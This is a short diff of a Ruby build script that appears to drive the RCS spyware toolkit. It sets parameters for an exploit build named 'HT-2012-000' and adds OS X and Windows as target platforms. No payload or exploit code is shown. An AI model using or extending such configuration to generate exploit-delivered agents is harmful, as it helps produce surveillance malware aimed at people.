@@ -73,6 +73,7 @@ system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o 
 ###################################################################################################
 params = {platform: 'exploit',
           generate: {exploit: 'HT-2012-000',
+                     platforms: ['osx', 'windows'],
                      binary: {demo: true, admin: false},
                      melt: {admin: false}
                     },
